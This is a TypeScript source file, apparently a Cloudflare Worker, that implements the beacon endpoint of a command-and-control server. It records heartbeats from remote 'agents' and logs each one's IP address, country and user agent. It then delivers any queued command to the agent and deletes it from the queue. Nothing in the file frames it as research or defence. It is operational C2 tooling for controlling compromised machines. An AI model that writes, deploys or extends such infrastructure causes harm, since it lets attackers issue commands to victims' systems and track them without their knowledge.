import { json, error } from "../core/response"
import {
  getCommand,
  deleteCommand
} from "../storage/commands"

export async function beacon(
  request: Request,
  env: Env
): Promise<Response> {

  if (request.method !== "POST") {
    return error("Method Not Allowed", 405)
  }

  let body: { id?: string }

  try {
    body = await request.json()
  } catch {
    return error("Invalid JSON", 400)
  }

  if (!body.id || typeof body.id !== "string") {
    return error("Invalid agent id", 400)
  }

  const agentId = body.id
  const now = new Date().toISOString()

  // -----------------------------
  // 1️⃣ ACTIVE AGENT HEARTBEAT (KV)
  // -----------------------------
  // Cheap, TTL-based, no JSON
  await env.C2_STORAGE.put(
    `active:${agentId}`,
    "1",
    { expirationTtl: 120 } // agent online if beaconed in last 2 mins
  )

  // -----------------------------
  // 2️⃣ UPDATE METADATA (D1)
  // -----------------------------
  await env.RESULTS_DB.prepare(`
    INSERT INTO agents (id, first_seen, last_seen, ip, country, user_agent)
    VALUES (?, ?, ?, ?, ?, ?)
    ON CONFLICT(id) DO UPDATE SET
      last_seen = excluded.last_seen,
      ip = excluded.ip,
      country = excluded.country,
      user_agent = excluded.user_agent
  `).bind(
    agentId,
    now,
    now,
    request.headers.get("CF-Connecting-IP"),
    request.headers.get("CF-IPCountry"),
    request.headers.get("User-Agent")
  ).run()

  // -----------------------------
  // 3️⃣ COMMAND DELIVERY (KV)
  // -----------------------------
  const cmd = await getCommand(env.C2_STORAGE, agentId)

  if (cmd) {
    await deleteCommand(env.C2_STORAGE, agentId)

    return json({
      command: cmd.command,
      commandId: cmd.id,
      interval: 60
    })
  }

  return json({
    command: null,
    interval: 60
  })
}
